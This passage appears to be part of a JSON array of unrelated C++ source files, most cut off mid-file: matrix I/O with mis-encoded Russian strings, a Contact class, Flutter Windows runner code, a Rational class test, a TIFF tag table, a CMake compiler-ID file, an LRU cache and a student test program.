valid_input));\n\t\t\tin_option = input[0];\n\t\t}\n\t} while (in_option != '1');\n\treturn 0;\n}\n\nvoid readFromConsole(int& matrix_n, int& matrix_m) {\n\tregex valid_number(\"[1-9][0-9]*\");\n\tstring input;\n\n\tdo {\n\t\tcout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00ee \u00f1\u00f2\u00f0\u00ee\u00ea (n): \";\n\t\tgetline(cin, input);\n\t} while (!regex_match(input, valid_number));\n\n\tmatrix_n = stoi(input);\n\n\tdo {\n\t\tcout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00ee \u00f1\u00f2\u00ee\u00eb\u00e1\u00f6\u00ee\u00e2 (m): \";\n\t\tgetline(cin, input);\n\t} while (!regex_match(input, valid_number));\n\tmatrix_m = stoi(input);\n}\n\nbool readFromFile(const char* input,  int& matrix_n, int& matrix_m) {\n\tifstream file(input);\n\n\tif (!file.is_open()) {\n\t\tcerr << \"\u00ce\u00f8\u00e8\u00e1\u00ea\u00e0 \u00ef\u00f0\u00e8 \u00ee\u00f2\u00ea\u00f0\u00fb\u00f2\u00e8\u00e8 \u00f4\u00e0\u00e9\u00eb\u00e0 \u00f1 \u00e2\u00f5\u00ee\u00e4\u00ed\u00fb\u00ec\u00ec\u00e8 \u00e4\u00e0\u00ed\u00ed\u00fb\u00ec\u00e8\" << endl;\n\t\treturn false;\n\t}\n\tif (!(file >> matrix_n >> matrix_m)) {\n\t\tcerr << \"\u00ce\u00f8\u00e8\u00e1\u00ea\u00e0 \u00f7\u00f2\u00e5\u00ed\u00e8\u00ff \u00f4\u00e0\u00e9\u00eb\u00e0 \u00f1 \u00e2\u00f5\u00ee\u00e4\u00ed\u00fb\u00ec\u00ec\u00e8 \u00e4\u00e0\u00ed\u00ed\u00fb\u00ec\u00e8\" << std::endl;\n\t\tfile.close();\n\t\treturn false;\n\t}\n\tchar e;\n\tif (file >> e) {\n\t\tcerr << \"\u00cd\u00e5\u00e2\u00e5\u00f0\u00ed\u00fb\u00e5 \u00e4\u00e0\u00ed\u00ed\u00fb\u00e5 \u00e2 \u00f4\u00e0\u00e9\u00eb\u00e5\" << std::endl;\n\t\tfile.close();\n\t\treturn false;\n\t}\n\n\treturn true;\n}\n\n\nvoid printConsole(double** matrix, int& matrix_n, int& matrix_m) {\n\tfor (int i{ 0 }; i < matrix_n; i++) {\n\t\tfor (int j{ 0 }; j < matrix_m; j++) {\n\t\t\tcout << matrix[i][j] << \"  \";\n\t\t}\n\t\tcout << endl;\n\t}\n}\n\nvoid writeToFile(const char* output, double** matrix, int& matrix_n, int& matrix_m) {\n\tofstream outputFile(output);\n\tif (!outputFile.is_open()) {\n\t\tcout << \"\u00ce\u00f8\u00e8\u00e1\u00ea\u00e0 \u00ef\u00f0\u00e8 \u00ee\u00f2\u00ea\u00f0\u00fb\u00f2\u00e8\u00e8 \u00f4\u00e0\u00e9\u00eb\u00e0 \u00e4\u00eb\u00ff \u00e7\u00e0\u00ef\u00e8\u00f1\u00e8\" << endl;\n\t}\n\telse {\n\t\tfor (int i{ 0 }; i < matrix_n; i++) {\n\t\t\tfor (int j{ 0 }; j< matrix_m; j++) {\n\t\t\t\toutputFile << matrix[i][j] << \"  \";\n\t\t\t}\n\t\t\toutputFile << endl;\n\t\t}\n\t\tcout << \"\u00d0\u00e5\u00e7\u00f3\u00eb\u00fc\u00f2\u00e0\u00f2 \u00ef\u00f0\u00ee\u00e3\u00f0\u00e0\u00ec\u00ec\u00fb \u00e7\u00e0\u00ef\u00e8\u00f1\u00e0\u00ed \u00e2 \u00f4\u00e0\u00e9\u00eb: \" << output << endl;\n\n\t}\n\toutputFile.close();\n}\n\n\nvoid freeMatrix(double**& matrix, int& matrix_n) {\n\tfor (int i{ 0 }; i < matrix_n; ++i) {\n\t\tdelete[] matrix[i];\n\t}\n\tdelete[] matrix;\n\tmatrix = nullptr;\n}\n",
    "#include \"Contact.hpp\"\n\nContact::Contact(void)\n{\n\t//std::cout << \"Contact created\" << std::endl;\n\treturn ;\n}\n\nContact::~Contact(void)\n{\n\t//std::cout << \"Contact destroyed\" << std::endl;\n\treturn ;\n}\n\nvoid Contact::setIndex(int index)\n{\n\tthis->_index = index;\n\treturn ;\n}\n\nvoid Contact::setFirstName(std::string firstName)\n{\n\tthis->firstName = firstName;\n\treturn ;\n}\n\nvoid Contact::setLastName(std::string lastName)\n{\n\tthis->lastName = lastName;\n\treturn ;\n}\n\nvoid Contact::setNickname(std::string nickname)\n{\n\tthis->nickname = nickname;\n\treturn ;\n}\n\nvoid Contact::setPhoneNumber(std::string phoneNumber)\n{\n\tthis->phoneNumber = phoneNumber;\n\treturn ;\n}\n\nvoid Contact::setDarkestSecret(std::string darkestSecret)\n{\n\tthis->darkestSecret = darkestSecret;\n\treturn ;\n}\n\nint Contact::getIndex(void) const\n{\n\treturn (this->_index);\n}\n\nstd::string\tContact::getFirstName(void) const\n{\n\treturn (this->firstName);\n}\n\nstd::string Contact::getLastName(void) const\n{\n\treturn (this->lastName);\n}\n\nstd::string Contact::getNickname(void) const\n{\n\treturn (this->nickname);\n}\n\nstd::string Contact::getPhoneNumber(void) const\n{\n\treturn (this->phoneNumber);\n}\n\nstd::string Contact::getDarkestSecret(void) const\n{\n\treturn (this->darkestSecret);\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"Rational.h\"\n#include <iostream>\nusing namespace std;\n\nint main()\n{\nint num1, num2, num3;\nchar junk;\ncout << \"part 1. ctor/set/get\" << endl;\ncout << \"enter a rational number:\" << endl;\ncin >> num1 >> junk >> num2;\nRational rat1;\nrat1.setNumerator(num1);\nrat1.setDenominator(num2);\ncout << \"numerator: \" << rat1.getNumerator() << endl;\ncout << \"denominator: \" << rat1.getDenominator() << endl;\ncout << endl;\ncout << \"enter a rational number: \" << endl;\ncin >> num1 >> junk >> num2;\nRational rat2(num1,num2);\nrat2.print();\ncout << endl << endl;\ncout << \"part 2. copy-ctor\" << endl;\nRational rat3(rat2);\nrat3.print();\ncout << endl << endl;\ncout << \"part 3. equals\" << endl;\nif (rat1.equal(rat2))\ncout << \"The two numbers are equal\" << endl;\nelse\ncout << \"The two numbers are different\" << endl;\ncout << endl;\ncout << \"part 4. makeEquals\" << endl;\nrat1.makeEquals(rat2);\nif (rat1.equal(rat2))\ncout << \"The two numbers are equal\" << endl;\nelse\ncout << \"The two numbers are different\" << endl;\ncout << endl;\ncout << \"part 5. addOne\" << endl;\nRational ans1;\nans1 = rat1.addOne();\nrat1.print();\ncout << \" + 1 = \";\nans1.print();\ncout << endl<<endl;\ncout << \"part 6. add\" << endl;\nRational ans2;\nans2 = rat1.add(rat3);\nrat1.print();\ncout << \" + \";\n\n",
    "\ufeff#include \"tiffhdr.hpp\"\n\n#include <sstream>\n#include <algorithm>\n#include <cstring>\n#include <cinttypes>\n\n// #define DEBUG_TIFFHeader 1\n\nnamespace UniformBitmap\n{\n\tconstexpr std::pair<const char*, uint16_t> IFDTagData[] =\n\t{\n\t\t{\"InteropIndex\", 0x0001},\n\t\t{\"InteropVersion\", 0x0002},\n\t\t{\"ProcessingSoftware\", 0x000b},\n\t\t{\"SubfileType\", 0x00fe},\n\t\t{\"OldSubfileType\", 0x00ff},\n\t\t{\"ImageWidth\", 0x0100},\n\t\t{\"ImageHeight\", 0x0101},\n\t\t{\"BitsPerSample\", 0x0102},\n\t\t{\"Compression\", 0x0103},\n\t\t{\"PhotometricInterpretation\", 0x0106},\n\t\t{\"Thresholding\", 0x0107},\n\t\t{\"CellWidth\", 0x0108},\n\t\t{\"CellLength\", 0x0109},\n\t\t{\"FillOrder\", 0x010a},\n\t\t{\"DocumentName\", 0x010d},\n\t\t{\"ImageDescription\", 0x010e},\n\t\t{\"Make\", 0x010f},\n\t\t{\"Model\", 0x0110},\n\t\t{\"JpgFromRawStart\", 0x0111},\n\t\t{\"OtherImageStart\", 0x0111},\n\t\t{\"StripOffsets\", 0x0111},\n\t\t{\"PreviewImageStart\", 0x0111},\n\t\t{\"StripOffsets\", 0x0111},\n\t\t{\"Orientation\", 0x0112},\n\t\t{\"SamplesPerPixel\", 0x0115},\n\t\t{\"RowsPerStrip\", 0x0116},\n\t\t{\"JpgFromRawLength\", 0x0117},\n\t\t{\"PreviewImageLength\", 0x0117},\n\t\t{\"StripByteCounts\", 0x0117},\n\t\t{\"OtherImageLength\", 0x0117},\n\t\t{\"MinSampleValue\", 0x0118},\n\t\t{\"MaxSampleValue\", 0x0119},\n\t\t{\"XResolution\", 0x011a},\n\t\t{\"YResolution\", 0x011b},\n\t\t{\"PlanarConfiguration\", 0x011c},\n\t\t{\"PageName\", 0x011d},\n\t\t{\"XPosition\", 0x011e},\n\t\t{\"YPosition\", 0x011f},\n\t\t{\"FreeOffsets\", 0x0120},\n\t\t{\"FreeByteCounts\", 0x0121},\n\t\t{\"GrayResponseUnit\", 0x0122},\n\t\t{\"GrayResponseCurve\", 0x0123},\n\t\t{\"T4Options\", 0x0124},\n\t\t{\"T6Options\", 0x0125},\n\t\t{\"ResolutionUnit\", 0x0128},\n\t\t{\"PageNumber\", 0x0129},\n\t\t{\"ColorResponseUnit\", 0x012c},\n\t\t{\"TransferFunction\", 0x012d},\n\t\t{\"Software\", 0x0131},\n\t\t{\"ModifyDate\", 0x0132},\n\t\t{\"Artist\", 0x013b},\n\t\t{\"HostComputer\", 0x013c},\n\t\t{\"Predictor\", 0x013d},\n\t\t{\"WhitePoint\", 0x013e},\n\t\t{\"PrimaryChromaticities\", 0x013f},\n\t\t{\"ColorMap\", 0x0140},\n\t\t{\"HalftoneHints\", 0x0141},\n\t\t{\"TileWidth\", 0x0142},\n\t\t{\"TileLength\", 0x0143},\n\t\t{\"TileOffsets\", 0x0144},\n\t\t{\"TileByteCounts\", 0x0145},\n\t\t{\"BadFaxLines\", 0x0146},\n\t\t{\"CleanFaxData\", 0x0147},\n\t\t{\"ConsecutiveBadFaxLines\", 0x0148},\n\t\t{\"SubIFD\", 0x014a},\n\t\t{\"A100DataOffset\", 0x014a},\n\t\t{\"InkSet\", 0x014c},\n\t\t{\"InkNames\", 0x014d},\n\t\t{\"NumberofInks\", 0x014e},\n\t\t{\"DotRange\", 0x0150},\n\t\t{\"TargetPrinter\", 0x0151},\n\t\t{\"ExtraSamples\", 0x0152},\n\t\t{\"SampleFormat\", 0x0153},\n\t\t{\"SMinSampleValue\", 0x0154},\n\t\t{\"SMaxSampleValue\", 0x0155},\n\t\t{\"TransferRange\", 0x0156},\n\t\t{\"ClipPath\", 0x0157},\n\t\t{\"XClipPathUnits\", 0x0158},\n\t\t{\"YClipPathUnits\", 0x0159},\n\t\t{\"Indexed\", 0x015a},\n\t\t{\"JPEGTables\", 0x015b},\n\t\t{\"OPIProxy\", 0x015f},\n\t\t{\"GlobalParametersIFD\", 0x0190},\n\t\t{\"ProfileType\", 0x0191},\n\t\t{\"FaxProfile\", 0x0192},\n\t\t{\"CodingMethods\", 0x0193},\n\t\t{\"VersionYear\", 0x0194},\n\t\t{\"ModeNumber\", 0x0195},\n\t\t{\"Decode\", 0x01b1},\n\t\t{\"DefaultImageColor\", 0x01b2},\n\t\t{\"T82Options\", 0x01b3},\n\t\t{\"JPEGTables\", 0x01b5},\n\t\t{\"JPEGProc\", 0x0200},\n\t\t{\"JpgFromRawStart\", 0x0201},\n\t\t{\"OtherImageStart\", 0x0201},\n\t\t{\"PreviewImageStart\", 0x0201},\n\t\t{\"ThumbnailOffset\", 0x0201},\n\t\t{\"ThumbnailLength\", 0x0202},\n\t\t{\"JpgFromRawLength\", 0x0202},\n\t\t{\"PreviewImageLength\", 0x0202},\n\t\t{\"ThumbnailLength\", 0x0202},\n\t\t{\"OtherImageLength\", 0x0202},\n\t\t{\"JPEGRestartInterval\", 0x0203},\n\t\t{\"JPEGLosslessPredictors\", 0x0205},\n\t\t{\"JPEGPointTransforms\", 0x0206},\n\t\t{\"JPEGQTables\", 0x0207},\n\t\t{\"JPEGDCTables\", 0x0208},\n\t\t{\"JPEGACTables\", 0x0209},\n\t\t{\"YCbCrCoefficients\", 0x0211},\n\t\t{\"YCbCrSubSampling\", 0x0212},\n\t\t{\"YCbCrPositioning\", 0x0213},\n\t\t{\"ReferenceBlackWhite\", 0x0214},\n\t\t{\"StripRowCounts\", 0x022f},\n\t\t{\"ApplicationNotes\", 0x02bc},\n\t\t{\"USPTOMiscellaneous\", 0x03e7},\n\t\t{\"RelatedImageFileFormat\", 0x1000},\n\t\t{\"RelatedImageWidth\", 0x1001},\n\t\t{\"RelatedImageHeight\", 0x1002},\n\t\t{\"Rating\", 0x4746},\n\t\t{\"XP_DIP_XML\", 0x4747},\n\t\t{\"StitchInfo\", 0x4748},\n\t\t{\"RatingPercent\", 0x4749},\n\t\t{\"SonyRawFileType\", 0x7000},\n\t\t{\"SonyToneCurve\", 0x7010},\n\t\t{\"VignettingCorrection\", 0x7031},\n\t\t{\"VignettingCorrParams\", 0x7032},\n\t\t{\"ChromaticAberrationCorrection\", 0x7034},\n\t\t{\"ChromaticAberrationCorrParams\", 0x7035},\n\t\t{\"DistortionCorrection\", 0x7036},\n\t\t{\"DistortionCorrParams\", 0x7037},\n\t\t{\"SonyRawImageSize\", 0x7038},\n\t\t{\"BlackLevel\", 0x7310},\n\t\t{\"WB_RGGBLevels\", 0x7313},\n\t\t{\"SonyCropTopLeft\", 0x74c7},\n\t\t{\"SonyCropSize\", 0x74c8},\n\t\t{\"ImageID\", 0x800d},\n\t\t{\"WangTag1\", 0x80a3},\n\t\t{\"WangAnnotation\", 0x80a4},\n\t\t{\"WangTag3\", 0x80a5},\n\t\t{\"WangTag4\", 0x80a6},\n\t\t{\"ImageReferencePoints\", 0x80b9},\n\t\t{\"RegionXformTackPoint\", 0x80ba},\n\t\t{\"WarpQuadrilateral\", 0x80bb},\n\t\t{\"AffineTransformMat\", 0x80bc},\n\t\t{\"Matteing\", 0x80e3},\n\t\t{\"DataType\", 0x80e4},\n\t\t{\"ImageDepth\", 0x80e5},\n\t\t{\"TileDepth\", 0x80e6},\n\t\t{\"ImageFullWidth\", 0x8214},\n\t\t{\"ImageFullHeight\", 0x8215},\n\t\t{\"TextureFormat\", 0x8216},\n\t\t{\"WrapModes\", 0x8217},\n\t\t{\"FovCot\", 0x8218},\n\t\t{\"MatrixWorldToScreen\", 0x8219},\n\t\t{\"MatrixWorldToCamera\", 0x821a},\n\t\t{\"Model2\", 0x827d},\n\t\t{\"CFARepeatPatternDim\", 0x828d},\n\t\t{\"CFAPattern2\", 0x828e},\n\t\t{\"BatteryLevel\", 0x828f},\n\t\t{\"KodakIFD\", 0x8290},\n\t\t{\"Copyright\", 0x8298},\n\t\t{\"ExposureTime\", 0x829a},\n\t\t{\"FNumber\", 0x829d},\n\t\t{\"MDFileTag\", 0x82a5},\n\t\t{",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include <iostream>\n#include <unordered_map>\n#include <list>\n#include <mutex>\n#include <memory>\n\ntemplate<typename KeyType, typename ValueType>\nclass LRUCache {\npublic:\n    // Constructor to initialize the cache with a given capacity\n    // Prevents compiler from using the constructor for implicit conversions\n    // Helps prevent accidental type conversions that might lead to bugs\n    explicit LRUCache(size_t size) : capacity(size) {}\n\n    // Function to retrieve a value from the cache\n    // Passed as const ref with '&' because there is no need to modify the object\n    // Also copying is too \"expensive\". Using the & ref ensures that the function does not alter the data.\n    // We do this because we don't want the program to alter the \"keys\" generated.\n    ValueType get(const KeyType& key) { \n        // Lock for thread safety, prevents concurrent modification during the fetch\n\tstd::lock_guard<std::mutex> lock(cache_mutex);\n        auto it = cache_map.find(key);  // Attempt to find the key in the hash map\n        if (it == cache_map.end()) {\n            throw std::range_error(\"Key not found\");  // Key not found, throw exception\n        }\n        // Moves the accessed node to the front of the list to mark it as most recently used\n        usage_list.splice(usage_list.begin(), usage_list, it->second);\n        return it->second->second;  // Return the value associated with the key\n    }\n\n    // Function to insert or update a value in the cache\n    // If cache is full, it evicts the LRU item\n    // New/updated item placed at the front of usage list\n    void put(const KeyType& key, const ValueType& value) {\n        // Lock for thread safety, ensures cache state is not corrupted by concurrent accesses and modifications\n\tstd::lock_guard<std::mutex> lock(cache_mutex);\n        auto it = cache_map.find(key);  // Check if key already exists in the cache\n        if (it != cache_map.end()) {\n            // If key exists, moves to the front to mark as most recently used\n            usage_list.splice(usage_list.begin(), usage_list, it->second);\n            it->second->second = value;  // Update the value\n            return;\n        }\n\n        // If the cache is full, we need to evict the least recently used item\n        if (usage_list.size() == capacity) {\n            auto last = usage_list.end();\n            last--;\n            cache_map.erase(last->first);  // Remove from map\n            usage_list.pop_back();  // Remove from list\n        }\n\n        // Insert the new key-value pair at the front of the list\n        usage_list.emplace_front(key, value);\n        cache_map[key] = usage_list.begin();  // Update map to point to the new element in the list\n    }\n\n    // Function to remove an object from the cache if it exists\n    void erase(const KeyType& key) {\n        // Lock to ensure thread safety\n\t// Ensures erase ops are performed safely w/o interference from other threads accessing/modifying data\n\tstd::lock_guard<std::mutex> lock(cache_mutex);\n        auto it = cache_map.find(key);  // Find the key in the map\n        if (it != cache_map.end()) {\n            usage_list.erase(it->second);  // Remove from list\n            cache_map.erase(it);  // Remove from map\n        }\n    }\n\n    // Function to dynamically adjust the cache's capacity\n    // Evicts least recently used items until size matches new capacity\n    void resize(size_t new_capacity) {\n        // Lock to ensure thread safety\n\t// Ensures the resizing cache des not conflict with other ops happening concurrently\n\tstd::lock_guard<std::mutex> lock(cache_mutex);\n        while (usage_list.size() > new_capacity) {  // If current size is larger than new capacity, reduce size\n            auto last = usage_list.end();\n            last--;\n            cache_map.erase(last->first);  // Remove least recently used items\n            usage_list.pop_back();\n        }\n        capacity = new_capacity;  // Set the new capacity\n    }\n\nprivate:\n    size_t capacity;  // Maximum number of elements in the cache\n    // List to track the least recent to most recently used objects\n    // Used doubly linked list to maintain the order from most recently used objects\n    // Allows O(1) complexity for adding/removing elements from the end of list\n    // This is crucial when using the LRU policy.\n    std::list<std::pair<KeyType, ValueType>> usage_list;  \n    // Map to quickly lookup elements in the list\n    // Links keys to iterators of their corresponding positions in the usage_list\n    // Enables 0(1) avg time complexity for accessing elements\n    std::unordered_map<KeyType, typename std::list<std::pair<KeyType, ValueType>>::iterator> cache_map;\n    std::mutex cache_mutex;  // Mutex to make class thread-safe\n};\n\nint main() {\n    LRUCache<int, std::string> cache(2);  // Create a cache for up to 2 items\n    cache.put(1, \"data1\");  // Insert item with key 1\n    cache.put(2, \"data2\");  // Insert item with key 2\n    try {\n        std::cout << \"1 -> \" << cache.get(1) << std::endl;  // Access item with k",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_webview_test\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#ifndef _MAIN\r\n#define _MAIN\r\n\r\n#include <iostream>\r\n#include \"biblioteca/funciones/strings.hpp\"\r\n#include \"biblioteca/funciones/tokens.hpp\"\r\n#include \"biblioteca/funciones/files.hpp\"\r\n#include \"biblioteca/tads/parte2/Array.hpp\"\r\n#include \"biblioteca/tads/parte2/Map.hpp\"\r\n#include \"biblioteca/tads/parte2/List.hpp\"\r\n#include \"biblioteca/tads/parte2/Stack.hpp\"\r\n#include \"biblioteca/tads/parte2/Queue.hpp\"\r\n#include \"biblioteca/tads/parte1/Coll.hpp\"\r\n#include \"biblioteca/tads/parte1/MultidimColl.hpp\"\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n   /*\r\n      cout<< length(\"Pirulito\")<<endl;\r\n      tutorial  1+i\r\n      cout<< charCount(\"Apap.ku 6apa\", 'x');\r\n\r\n      string s=\"patata en casa en arg\";\r\n\r\n      cout<< substring(s,2,length(s))<<endl;\r\n      //cout<< substring(s,5)<<endl;\r\n\r\n      int p = indexOf(s,'c');\r\n      cout << p << endl;\r\n\r\n      int p = indexOf(s,'a',5);\r\n      cout << p << endl;\r\n\r\n      int p = indexOf(s,\"en\");\r\n      cout << p << endl;\r\n\r\n      int p = indexOf(s,\"ta\",3);\r\n      cout << p << endl;\r\n\r\n      int p = lastIndexOf(s,'e');\r\n      cout << p << endl;\r\n\r\n      char palabrita='D';\r\n        int valor= charToInt(palabrita);\r\n        cout << valor << endl;\r\n\r\n      int numerito=65;\r\n      char letrita= intToChar(numerito);\r\n      cout << letrita << endl;\r\n\r\n      int numerote=4587412;\r\n      int posicion=0;\r\n      int digito= getDigit(numerote,posicion);\r\n      cout<< digito<<endl;\r\n\r\n      int digitocontador= 